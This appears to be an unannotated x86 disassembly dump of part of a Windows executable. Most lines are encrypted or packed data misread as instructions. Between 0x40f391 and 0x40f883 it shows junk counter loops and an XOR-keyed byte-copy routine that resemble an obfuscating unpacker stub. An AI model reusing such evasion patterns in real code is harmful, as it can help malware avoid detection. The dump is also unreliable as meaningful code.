  40f21c:	mov    al,0xff
  40f21e:	gs cs dec edi
  40f222:	cmc    
  40f223:	cmp    esi,esi
  40f225:	iret   
  40f226:	ins    DWORD PTR es:[edi],dx
  40f227:	or     eax,0xe2d1edfd
  40f22c:	jae    0x40f254
  40f22e:	loopne 0x40f251
  40f230:	(bad)  
  40f231:	mov    ecx,0xa3946f82
  40f236:	cdq    
  40f237:	jne    0x40f229
  40f239:	cwde   
  40f23a:	lods   eax,DWORD PTR ds:[esi]
  40f23b:	sti    
  40f23c:	cmp    DWORD PTR [eax],edi
  40f23e:	fmul   QWORD PTR [ebx+0x6b4df9a7]
  40f244:	es jl  0x40f2a7
  40f247:	(bad)  
  40f248:	adc    DWORD PTR [ecx+0x1060d42f],esi
  40f24e:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f250:	dec    ebx
  40f251:	test   ch,ch
  40f253:	adc    ecx,DWORD PTR [eax]
  40f255:	aaa    
  40f256:	mov    edx,0xad6a468f
  40f25b:	add    DWORD PTR [esi+edx*8-0x1],ebp
  40f25f:	test   al,0x47
  40f261:	push   esp
  40f262:	jno    0x40f2b8
  40f264:	stc    
  40f265:	outs   dx,BYTE PTR ds:[esi]
  40f266:	ss cld 
  40f268:	push   esp
  40f269:	mov    WORD PTR [ebp-0x54],ss
  40f26c:	aad    0x5c
  40f26e:	mov    WORD PTR [eax],cs
  40f270:	mov    esi,0xd3928881
  40f275:	lds    ecx,FWORD PTR [edi]
  40f277:	sbb    esi,edi
  40f279:	jo     0x40f29c
  40f27b:	jb     0x40f24a
  40f27d:	mov    eax,ds:0xb4f846b0
  40f282:	inc    ecx
  40f283:	shl    ch,0xc7
  40f286:	jnp    0x40f2bd
  40f288:	mov    ebx,gs
  40f28a:	xor    ebp,DWORD PTR [edi+0x6e90d22a]
  40f290:	jmp    0x40f26b
  40f292:	std    
  40f293:	sub    BYTE PTR [eax-0x9],0x4
  40f297:	icebp  
  40f298:	mov    ebx,0xe8cb57cd
  40f29d:	sbb    eax,DWORD PTR [ebp+0x252548d4]
  40f2a3:	mov    es,WORD PTR [ecx]
  40f2a5:	inc    ecx
  40f2a6:	sbb    DWORD PTR [edi-0x72],esp
  40f2a9:	sbb    WORD PTR [eax+0x19],sp
  40f2ad:	jns    0x40f247
  40f2af:	mov    BYTE PTR [edi+esi*4-0x3b],cl
  40f2b3:	in     eax,dx
  40f2b4:	sar    DWORD PTR [eax+0x2e],cl
  40f2b7:	inc    ecx
  40f2b8:	arpl   WORD PTR [eax],cx
  40f2ba:	jmp    0xd44e:0x30736f49
  40f2c1:	mov    dh,0xab
  40f2c3:	jo     0x40f256
  40f2c5:	mov    bh,cl
  40f2c7:	jmp    0xac9cdd5e
  40f2cc:	das    
  40f2cd:	in     eax,dx
  40f2ce:	adc    BYTE PTR [esi+0x49],dl
  40f2d1:	mov    bh,0x14
  40f2d3:	fild   WORD PTR [esi+edi*2-0x72]
  40f2d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2d8:	xor    bh,al
  40f2da:	mov    bh,0x8c
  40f2dc:	mul    ch
  40f2de:	jns    0x40f2a4
  40f2e0:	adc    eax,0xdc67728f
  40f2e5:	push   0x3c
  40f2e7:	push   ds
  40f2e8:	add    al,0x4f
  40f2ea:	push   ebp
  40f2eb:	jno    0x40f29e
  40f2ed:	sub    al,0x20
  40f2ef:	dec    ebx
  40f2f0:	mov    ds:0x9ddaf7d4,al
  40f2f5:	sbb    esp,DWORD PTR [ebx-0x3c]
  40f2f8:	xchg   ecx,eax
  40f2f9:	int3   
  40f2fa:	cmc    
  40f2fb:	lea    esi,[eax]
  40f2fd:	mov    al,BYTE PTR [edi+0xe20cc76]
  40f303:	ret    
  40f304:	mov    dl,0x2e
  40f306:	out    0x68,eax
  40f308:	sbb    BYTE PTR [edi],bh
  40f30a:	rcl    DWORD PTR [ecx-0x5ea1bd92],0xd1
  40f311:	mov    ch,0x3d
  40f313:	repnz pop ecx
  40f315:	fbstp  TBYTE PTR [edi+0x631971ba]
  40f31b:	jns    0x40f2aa
  40f31d:	jecxz  0x40f362
  40f31f:	ja     0x40f2da
  40f321:	push   esp
  40f322:	repnz dec DWORD PTR [ebx+ebp*1-0x79]
  40f327:	xchg   BYTE PTR [edi],bl
  40f329:	and    BYTE PTR [edi],ch
  40f32b:	scas   al,BYTE PTR es:[edi]
  40f32c:	fs sti 
  40f32e:	jp     0x40f2dd
  40f330:	adc    eax,0x67485302
  40f335:	pop    ebx
  40f336:	xlat   BYTE PTR ds:[ebx]
  40f337:	cmp    DWORD PTR [ebx+0x3c06937e],esi
  40f33d:	sbb    eax,0xeb46aa81
  40f342:	cmc    
  40f343:	dec    ebp
  40f344:	and    al,0x0
  40f346:	mov    edx,0x512ac5
  40f34b:	sub    eax,0xab9325c1
  40f350:	test   DWORD PTR [esi+0x2c5eb483],ebx
  40f356:	enter  0xd829,0x51
  40f35a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f35b:	xchg   DWORD PTR [edx-0x51],edi
  40f35e:	in     eax,0x25
  40f360:	fst    st(2)
  40f362:	sbb    BYTE PTR [edi],al
  40f364:	cmp    eax,0xd922d9ba
  40f369:	retf   0xf812
  40f36c:	mov    bl,0x90
  40f36e:	push   ebp
  40f36f:	push   ebx
  40f370:	dec    BYTE PTR [eax-0x4b]
  40f373:	pop    eax
  40f374:	or     eax,0xdca978a2
  40f379:	shr    BYTE PTR cs:[edi-0x7cea5d90],cl
  40f380:	xor    DWORD PTR [ebx-0x48],esp
  40f383:	xor    DWORD PTR [ebp+0x2581f89c],eax
  40f389:	daa    
  40f38a:	cmp    BYTE PTR [ebx+0x0],al
  40f38d:	add    BYTE PTR [eax],al
  40f38f:	add    BYTE PTR [eax],al
  40f391:	xor    ecx,ecx
  40f393:	xor    ecx,DWORD PTR ds:0x433827
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x433827,ecx
  40f3a0:	cmp    DWORD PTR ds:0x433827,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x433827,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x433827
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x433827,ecx
  40f3d0:	cmp    DWORD PTR ds:0x433827,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x43372b
  40f3e3:	mov    ecx,DWORD PTR ds:0x433803
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x433757,0x13
  40f3fb:	cmp    DWORD PTR ds:0x433757,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x433757,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x433757
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x433757,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x4337ef,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x4337ef
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x4337ef,ecx
  40f444:	cmp    DWORD PTR ds:0x4337ef,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x4337ef,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x4337ef
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x4337ef,ecx
  40f474:	cmp    DWORD PTR ds:0x4337ef,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x4337db,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x4337db
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x4337db,edx
  40f498:	cmp    DWORD PTR ds:0x4337db,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433991
  40f4af:	push   0x4339e7
  40f4b4:	push   0x4339cb
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x4337db,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433817
  40f4d2:	adc    DWORD PTR ds:0x433827,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax-0x20d294c7]
  40f540:	aam    0xd4
  40f542:	lods   al,BYTE PTR ds:[esi]
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	repz cmp esi,DWORD PTR [ebx-0x479d995d]
  40f550:	and    eax,0x5d0c0f63
  40f555:	sbb    bh,BYTE PTR ds:0xcea48b09
  40f55b:	or     ebp,DWORD PTR [edi]
  40f55d:	mov    al,0xe9
  40f55f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f560:	jmp    0x40f554
  40f562:	(bad)  
  40f563:	fcmovu st,st(5)
  40f565:	lahf   
  40f566:	push   es
  40f567:	out    dx,eax
  40f568:	and    BYTE PTR [ebx+0x34],ch
  40f56b:	mov    ch,0x1
  40f56d:	rcl    BYTE PTR [ebp-0x64],0xb8
  40f571:	pop    eax
  40f572:	iret   
  40f573:	xchg   ebx,eax
  40f574:	xchg   ebp,eax
  40f575:	mov    DWORD PTR [ebx+eax*2-0x4e1c2ae5],eax
  40f57c:	ins    BYTE PTR es:[edi],dx
  40f57d:	jl     0x40f50f
  40f57f:	nop
  40f580:	mov    ecx,0x65c7669d
  40f585:	nop
  40f586:	repz pop ss
  40f588:	(bad)  
  40f589:	in     eax,0x9f
  40f58b:	inc    esi
  40f58c:	in     al,dx
  40f58d:	xchg   ebx,eax
  40f58e:	dec    esp
  40f58f:	and    ah,bl
  40f591:	clc    
  40f592:	(bad)  [ecx-0xf15656d]
  40f598:	or     BYTE PTR [eax-0x49fcf8a],dl
  40f59e:	xor    edi,DWORD PTR [edx-0x46]
  40f5a1:	mov    cs,WORD PTR ds:0x3e154958
  40f5a7:	inc    ebx
  40f5a8:	sub    dh,BYTE PTR [ebp+ebx*4-0x72817717]
  40f5af:	popa   
  40f5b0:	js     0x40f543
  40f5b2:	repz fld DWORD PTR [esi+0x3799a97f]
  40f5b9:	je     0x40f632
  40f5bb:	cmp    BYTE PTR [esi-0x30],dh
  40f5be:	cmp    BYTE PTR [ebx],ah
  40f5c0:	mov    ebp,0xfcaaafcd
  40f5c5:	mov    bh,0x9e
  40f5c7:	push   cs
  40f5c8:	xchg   ebp,eax
  40f5c9:	pop    es
  40f5ca:	pop    esi
  40f5cb:	mul    DWORD PTR [edx-0xc19ff77]
  40f5d1:	jae    0x40f629
  40f5d3:	(bad)  
  40f5d4:	mov    ebp,0x6445d91d
  40f5d9:	mov    bl,0x9a
  40f5db:	push   esp
  40f5dc:	cmp    esi,DWORD PTR [edx+0x28309e1e]
  40f5e2:	adc    BYTE PTR [edi+0x2c6fc9d5],cl
  40f5e8:	test   ebx,ecx
  40f5ea:	rcl    DWORD PTR [ebx-0x4437443f],cl
  40f5f0:	fmulp  st(6),st
  40f5f2:	or     eax,0xb7c7db80
  40f5f7:	sbb    al,0xc3
  40f5f9:	xchg   edi,eax
  40f5fa:	inc    edx
  40f5fb:	fwait
  40f5fc:	out    0xce,eax
  40f5fe:	pop    ds
  40f5ff:	mov    ebx,DWORD PTR [edx]
  40f601:	scas   al,BYTE PTR es:[edi]
  40f602:	out    0xe1,eax
  40f604:	dec    ebx
  40f605:	shr    BYTE PTR ds:0x2dc1aec0,0x3e
  40f60c:	or     cl,ah
  40f60e:	xor    eax,0xd52ed8fd
  40f613:	jae    0x40f5ec
  40f615:	pop    eax
  40f616:	mov    eax,edx
  40f618:	std    
  40f619:	inc    ecx
  40f61a:	into   
  40f61b:	dec    ecx
  40f61c:	jge    0x40f603
  40f61e:	mov    ds:0xcb98c9dc,al
  40f623:	sub    dl,bh
  40f625:	loop   0x40f691
  40f627:	pop    edi
  40f628:	ja     0x40f629
  40f62a:	aam    0xbf
  40f62c:	push   ebp
  40f62d:	or     edi,edx
  40f62f:	dec    ebp
  40f630:	dec    esp
  40f631:	pop    ebp
  40f632:	pop    edx
  40f633:	inc    ebp
  40f634:	mov    ebp,0xf598a283
  40f639:	push   0x52
  40f63b:	sub    ch,bh
  40f63d:	cli    
  40f63e:	sub    ch,BYTE PTR [ecx-0x72c7ac5e]
  40f644:	pop    ebp
  40f645:	mov    ds:0x8abafc6c,eax
  40f64a:	mov    eax,ds:0xa32e7f0
  40f64f:	in     al,0x64
  40f651:	adc    al,BYTE PTR [ebx+ebp*1+0x9]
  40f655:	imul   eax,DWORD PTR [esi+0x78],0xffffff9e
  40f659:	js     0x40f66e
  40f65b:	retf   
  40f65c:	adc    al,0xb1
  40f65e:	dec    eax
  40f65f:	sub    al,0xd8
  40f661:	int3   
  40f662:	sahf   
  40f663:	add    DWORD PTR [eax-0x4f],ebx
  40f666:	(bad)  
  40f667:	je     0x40f689
  40f669:	cmp    esi,DWORD PTR [eax]
  40f66b:	fldcw  WORD PTR [edi-0x51]
  40f66e:	out    dx,al
  40f66f:	push   ds
  40f670:	(bad)  
  40f671:	jl     0x40f6aa
  40f673:	inc    ecx
  40f674:	or     DWORD PTR [ebp+0x73ff3a71],edx
  40f67a:	mov    edx,0x7514fba1
  40f67f:	inc    eax
  40f680:	out    0x79,eax
  40f682:	arpl   WORD PTR [ecx-0x3095b599],si
  40f688:	mov    dl,0x62
  40f68a:	bound  ebp,QWORD PTR [edi-0x6845e5f4]
  40f690:	sar    BYTE PTR [eax+0x2e32922a],0xb4
  40f697:	mov    ds:0xf4d8affe,al
  40f69c:	xchg   ecx,eax
  40f69d:	adc    bh,BYTE PTR [edi]
  40f69f:	push   edx
  40f6a0:	add    al,0xce
  40f6a2:	scas   al,BYTE PTR es:[edi]
  40f6a3:	ins    DWORD PTR es:[edi],dx
  40f6a4:	push   es
  40f6a5:	jmp    0xd9b14af
  40f6aa:	cli    
  40f6ab:	mov    WORD PTR [ebx+0x70a5866c],ss
  40f6b1:	mov    ds:0xeb7e1050,al
  40f6b6:	xchg   ecx,eax
  40f6b7:	out    0x4e,al
  40f6b9:	jo     0x40f6b6
  40f6bb:	xor    al,0x34
  40f6bd:	pop    ds
  40f6be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6bf:	outs   dx,BYTE PTR ds:[esi]
  40f6c0:	add    eax,0xdceb1ebd
  40f6c5:	dec    edx
  40f6c6:	mov    ebp,0x34efeb10
  40f6cb:	sbb    DWORD PTR [esp+ebp*4-0x3e],ecx
  40f6cf:	or     edi,DWORD PTR [esi+esi*4]
  40f6d2:	or     ecx,DWORD PTR [eax-0x3780c66f]
  40f6d8:	pop    esp
  40f6d9:	xchg   ebx,eax
  40f6da:	mov    dl,0xb0
  40f6dc:	fadd   DWORD PTR [esi-0x286fc328]
  40f6e2:	xchg   esi,eax
  40f6e4:	cmp    edi,DWORD PTR [ecx]
  40f6e6:	dec    eax
  40f6e7:	mov    ds,WORD PTR [ebx-0x7d288ddf]
  40f6ed:	(bad)  
  40f6ee:	push   0x3e45697b
  40f6f3:	push   0xffffffff
  40f6f5:	sub    eax,0x1e0c786b
  40f6fa:	xchg   edx,eax
  40f6fb:	and    ebp,ebp
  40f6fd:	xor    ecx,DWORD PTR [ebp-0x486a11a4]
  40f703:	fwait
  40f704:	push   0xe56f8b44
  40f709:	push   esp
  40f70a:	mov    ebx,0xaac66d97
  40f70f:	dec    eax
  40f710:	sahf   
  40f711:	and    ebx,DWORD PTR [eax+0x58]
  40f714:	mov    esi,0xe2d39891
  40f719:	fucomp st(5)
  40f71b:	popf   
  40f71c:	test   al,0x11
  40f71e:	add    BYTE PTR [ebp+0x16],al
  40f721:	pop    es
  40f722:	mov    eax,0x6f433f6a
  40f727:	xchg   ecx,eax
  40f728:	jb     0x40f6dc
  40f72a:	sub    eax,0xc11726d
  40f72f:	push   es
  40f730:	xchg   ebx,eax
  40f731:	fwait
  40f732:	xor    bl,BYTE PTR [edi-0x3f]
  40f735:	xor    al,0x16
  40f737:	mov    dh,0x6d
  40f739:	test   BYTE PTR [edx+0x34],ah
  40f73c:	in     al,0x6b
  40f73e:	aas    
  40f73f:	clc    
  40f740:	jb     0x40f78a
  40f742:	push   eax
  40f743:	jle    0x40f6e1
  40f745:	fdivp  st(3),st
  40f747:	dec    ebx
  40f748:	mov    ebp,0x5954e42
  40f74d:	in     eax,dx
  40f74e:	adc    BYTE PTR [eax+eax*1+0x74],ah
  40f752:	pop    ss
  40f753:	xchg   esi,eax
  40f754:	ret    0x4d0d
  40f757:	pop    ds
  40f758:	pop    esi
  40f759:	xor    ebx,ecx
  40f75b:	ins    DWORD PTR es:[edi],dx
  40f75c:	neg    BYTE PTR [ebx]
  40f75e:	dec    eax
  40f75f:	aam    0xbb
  40f761:	inc    edi
  40f762:	cmp    ebp,DWORD PTR [eax-0x35c88c10]
  40f768:	jl     0x40f74d
  40f76a:	inc    esi
  40f76b:	adc    al,0xfd
  40f76d:	nop
  40f76e:	push   eax
  40f76f:	dec    ebx
  40f770:	pop    es
  40f771:	out    dx,eax
  40f772:	add    eax,0x2d3b68b1
  40f777:	mov    BYTE PTR [ecx+0x29847405],bh
  40f77d:	ret    0x7c43
  40f780:	xor    al,BYTE PTR [edi-0x41cbdc8f]
  40f786:	xor    eax,0xd1ddbf0c
  40f78b:	div    ebx
  40f78d:	push   es
  40f78e:	mov    DWORD PTR [ebp-0x3e],0xe4d37618
  40f795:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f796:	mov    ch,0x3b
  40f798:	sub    BYTE PTR [ebx+0x7592a91c],0x9b
  40f79f:	into   
  40f7a0:	(bad)  
  40f7a1:	lea    ecx,[ebp+0x68]
  40f7a4:	test   eax,0x65382885
  40f7a9:	loop   0x40f7dc
  40f7ab:	jmp    0x40f740
  40f7ad:	push   DWORD PTR [esi-0x61]
  40f7b0:	push   esi
  40f7b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7b2:	mov    ah,BYTE PTR [edx]
  40f7b4:	into   
  40f7b5:	ds pop ss
  40f7b7:	sbb    edx,ecx
  40f7b9:	xor    al,0x1e
  40f7bb:	fsubr  QWORD PTR [edx+0x2339fd9f]
  40f7c1:	mov    dl,0xae
  40f7c3:	push   esi
  40f7c4:	pop    edx
  40f7c5:	mov    eax,DWORD PTR [edi+edx*2]
  40f7c8:	mov    bl,0x98
  40f7ca:	and    BYTE PTR [ebp+eax*4+0xc],ah
  40f7ce:	mov    eax,ds:0x6dedb9ec
  40f7d3:	inc    edx
  40f7d4:	aam    0x24
  40f7d6:	or     BYTE PTR [esi+0x72],0x1c
  40f7da:	fs out 0xfc,al
  40f7dd:	mov    dl,0x2c
  40f7df:	or     esi,DWORD PTR [esi-0x8b995ab]
  40f7e5:	sbb    eax,0x9fb47b08
  40f7ea:	push   0x2b
  40f7ec:	jg     0x40f77b
  40f7ee:	inc    esi
  40f7ef:	sbb    BYTE PTR [eax+0x34],bl
  40f7f2:	push   esi
  40f7f3:	push   0x48b0c276
  40f7f8:	das    
  40f7f9:	xchg   esp,eax
  40f7fa:	test   BYTE PTR [eax+edi*1+0x33],al
  40f7fe:	adc    al,0x9a
  40f800:	push   ecx
  40f801:	loope  0x40f7bf
  40f803:	call   0xa241:0xad8abce
  40f80a:	jne    0x40f830
  40f80c:	ja     0x40f850
  40f80e:	and    eax,0xb0d7fea
  40f813:	dec    ecx
  40f814:	repz sub BYTE PTR [esi-0x5ae4097f],0x19
  40f81c:	das    
  40f81d:	dec    ecx
  40f81e:	dec    ebp
  40f81f:	loopne 0x40f7d7
  40f821:	cmp    DWORD PTR [edx],edi
  40f823:	les    ebx,FWORD PTR [eax]
  40f825:	cld    
  40f826:	sub    DWORD PTR [esi+0x3e],ecx
  40f829:	push   edx
  40f82a:	jg     0x40f89f
  40f82c:	fsubr  QWORD PTR [ecx+0x3b884d58]
  40f832:	mov    ebp,fs
  40f834:	jns    0x40f8b0
  40f836:	cwde   
  40f837:	xor    dh,BYTE PTR [edi]
  40f839:	cmp    dh,ch
  40f83b:	lock pop esp
  40f83d:	ret    
  40f83e:	jecxz  0x40f7d2
  40f840:	addr16 mov cl,0x51
  40f843:	dec    ecx
  40f844:	ss je  0x40f82b
  40f847:	jnp    0x40f7f6
  40f849:	xchg   ebx,eax
  40f84a:	inc    ebx
  40f84b:	xor    edi,ecx
  40f84d:	add    edi,esi
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0xb899b43f
  40f897:	push   esp
  40f898:	shr    BYTE PTR [ebx+0x7d7c7e7e],cl
  40f89e:	jle    0x40f91e
  40f8a0:	mov    ch,0xb6
  40f8a2:	add    DWORD PTR [edi+eax*4+0xb],esi
  40f8a6:	xor    edx,0xee56dcd5
  40f8ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8ad:	ins    BYTE PTR es:[edi],dx
  40f8ae:	out    0xd3,al
  40f8b0:	mov    al,0xd8
  40f8b2:	lahf   
  40f8b3:	mov    ?,eax
  40f8b5:	inc    edx
  40f8b6:	lahf   
  40f8b7:	jmp    0xf19d:0x3b56c0a2
  40f8be:	fdivp  st(0),st
  40f8c0:	bound  edi,QWORD PTR [edx]
  40f8c2:	int3   
  40f8c3:	sbb    ch,bl
  40f8c5:	enter  0xf5c8,0xc2
  40f8c9:	adc    al,BYTE PTR [edi+edi*8-0x497d55d]
  40f8d0:	push   esi
  40f8d1:	mov    eax,ecx
  40f8d3:	push   esp
  40f8d4:	sahf   
  40f8d5:	xor    bl,bl
  40f8d7:	and    eax,0xe6706b6
  40f8dc:	clc    
  40f8dd:	pop    ebp
  40f8de:	or     ch,dh
  40f8e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8e1:	and    ebp,DWORD PTR [edx]
  40f8e3:	mov    ecx,0xbd73e9ee
  40f8e8:	ja     0x40f8d4
  40f8ea:	push   esp
  40f8eb:	test   eax,0x6aead86b
  40f8f0:	inc    ebp
  40f8f1:	sub    DWORD PTR [ebp-0x5a],eax
  40f8f4:	xor    al,0x29
  40f8f6:	ret    0x1d56
  40f8f9:	lods   al,BYTE PTR ds:[esi]
  40f8fa:	mov    eax,0x2b365b12
  40f8ff:	sbb    ecx,esp
  40f901:	cmp    al,0xce
  40f903:	xchg   ebx,eax
  40f904:	in     eax,0xea
  40f906:	cmp    al,0x55
  40f908:	or     eax,0x8ecdd90b
  40f90d:	sbb    ch,bh
  40f90f:	cmp    BYTE PTR [edx+0x11],0x8c
  40f913:	in     al,0x1d
  40f915:	adc    ah,bh
  40f917:	add    edx,DWORD PTR [edi]
  40f919:	push   cs
  40f91a:	mov    cl,0xd7
  40f91c:	(bad)  
  40f91d:	and    ch,BYTE PTR [esi-0x7badef9b]
  40f923:	sahf   
  40f924:	push   edi
  40f925:	xor    DWORD PTR [esi],0x3daa451
  40f92b:	pop    edi
  40f92c:	mov    es,WORD PTR [edi+ebx*1-0x6e75301]
  40f933:	daa    
  40f934:	int    0x93
  40f936:	push   ds
  40f937:	mov    esp,0x3e5b1885
  40f93c:	neg    BYTE PTR [edx+eiz*8-0x739e006e]
  40f943:	push   ebx
  40f944:	out    dx,eax
  40f945:	sbb    ebx,DWORD PTR [edi]
  40f947:	pop    edx
  40f948:	stc    
  40f949:	cmp    eax,0xb9157c3e
  40f94e:	sbb    DWORD PTR [eax],ebp
  40f950:	push   0x3b87e3da
  40f955:	xor    ecx,DWORD PTR [ebx]
  40f957:	dec    eax
  40f958:	idiv   BYTE PTR [edi-0x182a0a95]
  40f95e:	ins    BYTE PTR es:[edi],dx
  40f95f:	sbb    BYTE PTR [ebp+0x5998ff7b],cl
  40f965:	and    bl,BYTE PTR [edi-0x46]
  40f968:	pop    esp
  40f969:	cmp    DWORD PTR [edi-0x71],esi
  40f96c:	dec    edx
  40f96d:	sahf   
  40f96e:	sbb    eax,0xf33aded6
  40f973:	je     0x40f97c
  40f975:	test   eax,0xe27e08ed
  40f97a:	aad    0x35
  40f97c:	push   ebp
  40f97d:	out    0xc5,eax
  40f97f:	jne    0x40f9f0
  40f981:	pop    edx
  40f982:	and    DWORD PTR [eax],ebx
  40f984:	adc    BYTE PTR [ecx+0x11],0xe2
  40f988:	fs cmovge esi,eax
  40f98c:	stc    
  40f98d:	pop    ds
  40f98e:	xor    ebx,DWORD PTR [esp+ecx*8]
  40f991:	ss int 0x9
  40f994:	jmp    0x6464:0x31632514
  40f99b:	and    DWORD PTR [ecx-0x3c],ecx
  40f99e:	cmp    BYTE PTR [ebp-0x4b],al
  40f9a1:	loope  0x40f9fd
  40f9a3:	xchg   esi,eax
  40f9a4:	test   BYTE PTR [ebx+edx*1+0x32],ch
  40f9a8:	aad    0x11
  40f9aa:	jno    0x40f9b0
  40f9ac:	and    bl,BYTE PTR [edi-0xde878cc]
  40f9b2:	push   cs
  40f9b3:	jle    0x40fa01
  40f9b5:	(bad)  
  40f9b6:	mov    BYTE PTR [ecx],bh
  40f9b8:	aas    
  40f9b9:	jmp    0x40f9ee
  40f9bb:	pop    edx
  40f9bc:	or     BYTE PTR [edi],bl
  40f9be:	int    0x2f
  40f9c0:	inc    ecx
  40f9c1:	sub    eax,0x8c1efafc
  40f9c6:	clc    
  40f9c7:	out    0x85,al
  40f9c9:	pop    edx
  40f9ca:	mov    edx,0x49e74d6
  40f9cf:	call   0x96d91144
  40f9d4:	mov    ah,0x9d
  40f9d6:	dec    ebx
  40f9d7:	outs   dx,BYTE PTR ds:[esi]
  40f9d8:	ret    
  40f9d9:	in     al,0x6
  40f9db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9dc:	mov    ch,0xff
  40f9de:	bound  eax,QWORD PTR [esi+ebp*4]
  40f9e1:	push   ds
  40f9e2:	cmp    ch,cl
  40f9e4:	inc    ebx
  40f9e5:	iret   
  40f9e6:	cmp    eax,0x2cd99915
  40f9eb:	or     ch,BYTE PTR [esi]
  40f9ed:	dec    esi
  40f9ee:	call   0xbb6b:0x5f7a7eba
  40f9f5:	cmp    DWORD PTR [edi+0x6e14b496],ebp
  40f9fb:	cmp    DWORD PTR [esi],edi
  40f9fd:	rcr    BYTE PTR [edx],cl
  40f9ff:	cmp    al,0xee
  40fa01:	ror    BYTE PTR [ebp-0x65],cl
  40fa04:	cmp    al,ah
  40fa06:	bound  eax,QWORD PTR [ebx+0x26582158]
  40fa0c:	mov    bh,BYTE PTR [ecx]
  40fa0e:	push   edi
  40fa0f:	mov    ecx,0x15b459ab
  40fa14:	dec    ebx
  40fa15:	jae    0x40fa7a
  40fa17:	mov    WORD PTR [edi],fs
  40fa19:	mov    edx,0xa0b34ed3
  40fa1e:	cs inc esi
  40fa20:	outs   dx,DWORD PTR ds:[esi]
  40fa21:	jp     0x40fa09
  40fa23:	push   cs
  40fa24:	jmp    0xc9776bbc
  40fa29:	mov    edi,0x93dbbae2
  40fa2e:	loopne 0x40fa02
  40fa30:	mov    dl,0x1b
  40fa32:	rcr    cl,0x12
  40fa35:	mov    ch,0xa6
  40fa37:	mov    esi,0x51903153
  40fa3c:	add    al,0xad
